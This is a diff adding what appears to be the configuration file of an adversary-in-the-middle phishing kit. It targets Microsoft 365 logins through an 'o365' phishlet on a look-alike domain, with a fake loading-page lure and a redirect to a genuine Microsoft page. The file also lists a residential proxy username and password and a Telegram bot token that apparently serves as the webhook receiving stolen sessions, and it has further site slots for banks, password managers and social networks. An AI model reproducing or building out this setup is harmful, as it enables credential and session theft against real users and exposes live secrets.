@@ -1,0 +1,45 @@
+adminpage_path: 96c8263d
+blacklist_mode: unauth
+ip: 44.200.156.158
+lures:
+    - hostname: ""
+      path: /iul1/_//1xoqrc
+      redirect_url: https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11
+      phishlet: o365
+      template: cloudflare_new_loading.html
+      ua_filter: ""
+      info: ""
+      og_title: ""
+      og_desc: ""
+      og_image: ""
+      og_url: ""
+proxy_address: proxy.packetstream.io
+proxy_enabled: false
+proxy_password: jRqCydqWdAWNkVlg_country-UnitedStates
+proxy_port: 31112
+proxy_type: http
+proxy_username: ironmarvell01
+redirect_key: oy
+server: insomniamedsrx.com
+simplebot_enabled: false
+site_domains:
+    coinbase: ""
+    dashlane: ""
+    glady: ""
+    google: ""
+    huntington: ""
+    instagram: ""
+    knowbe4: ""
+    lastpass: ""
+    linkedin: ""
+    nfcu: ""
+    o365: insomniamedsrx.com
+    payfit: ""
+    snapchat: ""
+sites_enabled:
+    - o365
+useragent_override: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+verification_key: fn
+verification_token: df2e
+webhook_telegram: 5237410706:AAG1NMTsQPp-eDTeFnyof60s9unNSPBuk8c/5711023485
+webhook_verbosity: 1
